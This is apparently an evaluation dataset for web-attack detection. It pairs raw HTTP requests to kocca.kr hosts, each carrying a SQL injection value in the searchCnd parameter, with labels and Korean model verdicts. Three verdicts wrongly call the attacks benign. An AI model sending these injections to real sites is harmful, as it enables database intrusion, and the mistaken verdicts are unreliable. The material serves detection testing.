Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
14081,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%203006%3D3006%20AND%20%28%28%288828%3D8828&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20110518 Firefox/4.0.1\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=RGhmgkPdM6RfnKQFBSjyJ2xLpYDLKSpLZpQXHfynfyN7QbnhB1Dh!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"주어진 Payload는 SQL Injection 공격을 시도하는 시도로 판단됩니다.

공격 여부(0:비공격, 1:공격) : 1 (공격)
공격 구문 : searchCnd=%29%29%29%20AND%203006%3D3006%20AND%20%28%28%288828%3D8828
공격 유형 : SQL Injection
이유 : Payload에서 searchCnd 매개변수에 SQL Injection에 사용되는 특수문자와 조건이 포함되어 있으며, 이는 시스템에 대한 해킹 시도로 해석될 수 있습니다. SQL Injection은 악의적인 사용자가 애플리케이션의 데이터베이스에 액세스하거나 데이터를 조작하는 데 사용되는 보안 취약점입니다."
17583,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%20AND%208348%3D8348%20AND%20%28%28%22HqHj%22%20LIKE%20%22HqHj&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.1.3) Gecko/20070310 Firefox/2.0.0.3 (Debian-2.0.0.3-2)\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=tJhHgkrpLT9xx2LLHFb9DyT1vWJGtWzRzvfTQ04xLMPJC1dcYNJh!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%29%29%20AND%208348%3D8348%20AND%20%28%28%22HqHj%22%20LIKE%20%22HqHj&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1
공격 유형 : SQL Injection(SQL 인젝션)
이유 : URL의 searchCnd 파라미터에 SQL 인젝션을 시도하는 코드가 삽입되어 있습니다. 이를 통해 악의적인 사용자가 데이터베이스에 대한 민감한 정보를 노출하거나 조작할 수 있습니다."
4799,"GET /portal/bbs/list/B0000204.do?searchCnd=%22%20AND%209847%3D6191%20AND%20%22DIGG%22%20LIKE%20%22DIGG&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)\r\nReferer: http://bestgame.kocca.kr:80/portal/bbs/list/B0000204.do\r\nHost: bestgame.kocca.kr\r\nCookie: KCSESSIONID=RyRLgt7ptTh19xNyHSHGnrRY5j7jhq5XrCGz2yP3H4WhR0Hs0QGL!1739629523!965280821\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/list/B0000204.do?searchCnd=%22%20AND%209847%3D6191%20AND%20%22DIGG%22%20LIKE%20%22DIGG&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1
공격 유형 : SQL Injection
이유 : URL의 searchCnd 파라미터에서 SQL Injection을 시도하는 구문이 포함되어 있습니다. 'AND 9847=6191'와 같은 조건을 주어 웹 애플리케이션의 데이터베이스에 대한 비법적인 접근을 시도하고 있습니다. 이는 악의적인 사용자가 시스템에 해를 끼칠 수 있는 보안 취약점으로 이어질 수 있습니다."
13028,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%29%20AND%207854%3D7676%20AND%20%28%28%28%27uDKD%27%20LIKE%20%27uDKD&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%29%20AND%207854%3D7676%20AND%20%28%28%28%27uDKD%27%20LIKE%20%27uDKD&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\n
공격 유형 : SQL Injection (SQL 인젝션)
이유 : URL의 searchCnd 매개변수에 SQL Injection 공격을 시도하는 구문이 포함되어 있습니다. 이를 통해 데이터베이스에 악의적인 SQL 쿼리를 주입할 수 있으며, 이는 시스템의 데이터 무결성을 침해할 수 있습니다."
25886,"GET /cop/bbs/view/B0000144/1818887.do?searchCnd=%22%29%20AND%202456%3D2456%20AND%20%28%22Pjik%22%3D%22Pjik&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200900&categorys=0&subcate=0&cateCode=&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=1 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12\r\nCookie: KCSESSIONID=LBJ0grLQjQPF7t4c0ZhQSmZTFvf0vh3LKlBvrgGTG1H1JrGG7skv!-368784361!385399486\r\nHost: m.kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"주어진 페이로드는 HTTP GET 요청이며, 주소에 SQL 인젝션 공격 시도가 포함되어 있습니다. 

공격 여부(0:비공격, 1:공격) : 1 (공격)  
공격 구문 : searchCnd=%22%29%20AND%202456%3D2456%20AND%20%28%22Pjik%22%3D%22Pjik  
공격 유형 : SQL 인젝션  
이유 : GET 요청의 주소인 searchCnd 매개변수에 SQL 인젝션 취약점을 이용한 공격 시도가 포함되어 있습니다. 이 공격은 데이터베이스에 악의적인 목적으로 액세스하려는 시도로 간주됩니다."
2197,"GET /portal/bbs/view/B0158919/1939242.do;KCSESSIONID=4sT3d50LjFLBg0sVtcKwn0nXfmY2vv8lJdQQ7CggG0QtM8Hj6zGJ!-1779590607!1536097409?searchCnd=%20AND%201437%3D1437&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=203296&categorys=1&subcate=0&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=%2C127&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&pageIndex=1 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009060309 Linux Mint/5 (Elyssa) Firefox/3.0.11\r\nCookie: KCSESSIONID=mxQygskLYMTxYbfQBqXMq3jLPLmck3GwgnV0wnb77BGJ22y9SFvF!1739629523!965280821\r\nHost: kocca.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,0,False,"해당 페이로드는 보여지는 부분에서는 공격으로 보이지 않습니다. 왜냐하면 GET 요청이며 특별히 악의적인 내용이나 공격적인 요소가 없기 때문입니다. 

따라서 공격 여부는 0(비공격)으로 판단됩니다."
32577,"GET /cop/bbs/view/B0000144/1818887.do?searchCnd=%22%29%20AND%205085%3D9983%20AND%20%28%22bkNw%22%3D%22bkNw&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200900&categorys=0&subcate=0&cateCode=&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=1 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12\r\nCookie: KCSESSIONID=LBJ0grLQjQPF7t4c0ZhQSmZTFvf0vh3LKlBvrgGTG1H1JrGG7skv!-368784361!385399486\r\nHost: m.kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /cop/bbs/view/B0000144/1818887.do?searchCnd=%22%29%20AND%205085%3D9983%20AND%20%28%22bkNw%22%3D%22bkNw&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200900&categorys=0&subcate=0&cateCode=&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=1 HTTP/1.1
공격 유형 : SQL Injection
이유 : URL 파라미터 searchCnd에 SQL Injection 공격 시도가 포함되어 있습니다. 'AND 5085=9983'와 같은 쿼리를 삽입하여 데이터베이스에 대한 정보를 노출하려는 시도가 있습니다."
6332,"GET /portal/bbs/view/B0000204/1946051.do?searchCnd=%27%29%29%20AND%201645%3D2382%20AND%20%28%28%27mZxS%27%3D%27mZxS&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200253&categorys=4&subcate=67&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=3 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4\r\nCookie: KCSESSIONID=HMdkgrcLBLfjRfnsXWqMQ0Q5bvQSDwH1hgGw4Tk1WbJQDcMHnVnX!-368784361!385399486\r\nHost: sso.kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,0,False,"주어진 Payload는 HTTP GET 요청입니다. 이 요청은 `/portal/bbs/view/B0000204/1946051.do` 경로로 이루어져 있고, `searchCnd`, `menuNo`, `categorys`, `subcate`, `cateCode`, `delCode` 등의 쿼리 파라미터를 포함하고 있습니다. User-Agent를 통해 요청을 보낸 클라이언트는 Macintosh 기반의 Chrome 브라우저인 것으로 보입니다.

주어진 Payload는 공격이 아닌 일반적인 HTTP GET 요청으로 보입니다. 주요 쿼리 파라미터에는 특별한 문자나 패턴이 포함되어 있지 않고, 일반적인 요청 헤더가 포함되어 있습니다. 따라서 이 요청은 공격으로 간주되지 않고, 공격 여부를 0(비공격)로 판단할 수 있습니다."
8899,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%22%20WHERE%207087%3D7087%20AND%209433%3D7375--%20sWzq&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1

공격 구문 : WHERE 7087=7087 AND 9433=7375-- sWzq

공격 유형 : SQL Injection

해당 Payload는 SQL Injection 공격을 시도하는 것으로 판단됩니다. 입력 필드에 WHERE 절과 AND 연산자가 포함되어 있고, 주석 (--), 공백을 이용하여 기존 쿼리를 무력화시키고 새로운 조건을 추가하려는 시도가 있습니다. 이는 데이터베이스에 대한 악의적인 접근을 시도하는 보안 취약점 공격 방식 중 하나인 SQL Injection 공격입니다."
28122,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%20AND%203911%3D7693--%20odwz&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.9.1.6) Gecko/20100107 Fedora/3.5.6-1.fc12 Firefox/3.5.6\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=258WgkhPJKjDFGpwMvp5h5vL26rrLnyH1RhtKcdwh7NsVsVgPXMb!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,0,False,"주어진 페이로드는 일반적인 HTTP GET 요청으로 보이며, 일반적인 웹 서비스에 대한 요청으로 판단됩니다. 따라서 이 요청은 공격으로 간주되지 않으며, 공격 여부는 0(비공격)으로 판단됩니다.

해당 페이로드는 웹 포털 시스템의 게시판 게시물을 조회하는 요청으로 보입니다. Referer 헤더를 통해 이전 페이지 정보를 전달하고, Cookie를 통해 세션 정보를 유지하고 있습니다. User-Agent 헤더를 통해 클라이언트의 브라우저 정보를 전달하고 있습니다.

따라서 이 요청은 일반적인 웹 서비스 요청으로, 공격 구문이나 공격 유형은 없습니다."
3888,"GET /portal/bbs/list/B0000204.do?searchCnd=%27%20AND%207475%3D5074%20AND%20%27THWg%27%3D%27THWg&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.9.0.5) Gecko/2008121622 Ubuntu/8.10 (intrepid) Firefox/3.0.5\r\nCookie: KCSESSIONID=SCLJgspJkpQm0nZ7qsJ47gttH6Qb2MLWZh1KT3yYGnhjJ3q01lz1!1739629523!965280821\r\nHost: bestgame.kocca.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"주어진 페이로드를 분석해보면, URL에서 검색 조건으로 SQL Injection 공격 시도가 있습니다. SQL Injection은 악의적인 사용자가 애플리케이션의 보안을 뚫어 데이터베이스에 액세스하거나 조작하는 공격 유형 중 하나입니다. 

공격 여부(0:비공격, 1:공격) : 1 (공격)  
공격 구문 : searchCnd=%27%20AND%207475%3D5074%20AND%20%27THWg%27%3D%27THWg  
공격 유형 : SQL Injection  
이유 : URL의 searchCnd 파라미터에 SQL Injection 공격 시도가 포함되어 있습니다. 이는 쿼리를 왜곡하거나 조작하여 데이터베이스에 대한 액세스를 시도하거나 민감한 정보를 유출할 수 있는 보안 취약점을 악용하는 공격입니다."
28749,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%20WHERE%207797%3D7797%20AND%202916%3D2119--%20RHTy&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : WHERE 7797=7797 AND 2916=2119--
공격 유형 : SQL Injection
이유 : URL에서 전달되는 searchCnd 매개변수에 SQL Injection 공격 코드가 포함되어 있음. ""WHERE 7797=7797 AND 2916=2119--"" 부분은 SQL 쿼리문을 왜곡시켜서 원래의 의도와는 다른 동작을 유도하는 공격 코드로 해석될 수 있음."
22139,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%20AND%209373%3D8561%20AND%20%27yfrF%27%20LIKE%20%27yfrF&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"주어진 페이로드를 분석한 결과, 이는 SQL Injection 공격을 시도하는 페이로드로 판단됩니다.

공격 여부(0:비공격, 1:공격) : 1 (공격)
공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%20AND%209373%3D8561%20AND%20%27yfrF%27%20LIKE%20%27yfrF&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1
공격 유형 : SQL Injection
이유 : URL의 searchCnd 파라미터에 SQL Injection을 시도하는 쿼리가 포함되어 있습니다. 'AND 9373=8561 AND 'yfrF' LIKE 'yfrF'와 같은 조건을 추가하여 SQL 쿼리를 변경하려는 시도가 보입니다. 이는 악의적인 사용자가 데이터베이스에 대한 민감한 정보를 노출하거나 조작하려는 시도일 수 있습니다. 따라서 이 페이로드는 공격으로 간주됩니다."
27920,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%209605%3D6259%20AND%20%28%28%288753%3D8753&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=5LGlgkxJkS0zLXsXHMGC7c1rl1rFgH9TxHvR91QRQ6LRzj1xkcVg!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1

공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%209605%3D6259%20AND%20%28%28%288753%3D8753&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1

공격 유형 : SQL Injection

이유 : 요청된 URL에 SQL Injection 공격에 사용되는 특수 문자와 조건문이 포함되어 있습니다. 이는 웹 애플리케이션의 취약점을 이용하여 데이터베이스를 비정상적으로 조작하려는 시도로 해석될 수 있습니다."
26754,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%20AND%206938%3D9763%20AND%20%28%28%27xozA%27%3D%27xozA&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%20AND%206938%3D9763%20AND%20%28%28%27xozA%27%3D%27xozA&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1
공격 유형 : SQL Injection
이유 : GET 요청의 URL 파라미터인 searchCnd에 SQL Injection 공격을 시도하는 쿼리가 포함되어 있습니다. 이를 통해 악의적인 사용자가 데이터베이스에 액세스하거나 데이터를 조작할 수 있으며 보안 상의 위험을 초래할 수 있습니다."
30186,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%20AND%206868%3D1519%20AND%20%28%28%27RxuL%27%3D%27RxuL&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1

공격 구문 : GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%20AND%206868%3D1519%20AND%20%28%28%27RxuL%27%3D%27RxuL&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1

공격 유형 : SQL Injection (SQL 인젝션)

해당 Payload는 SQL Injection 공격을 시도하는 구문으로 볼 수 있습니다. SQL Injection은 웹 애플리케이션의 보안 취약점을 이용하여 악의적인 SQL 쿼리를 실행하는 공격 유형 중 하나로, 주로 입력 폼이나 매개변수를 통해 악의적인 SQL 구문을 주입하여 데이터베이스를 조작하거나 민감한 정보를 노출시키는 공격입니다. 이 경우에는 URL의 파라미터를 통해 SQL Injection을 시도하려는 시도가 있었음을 확인할 수 있습니다."
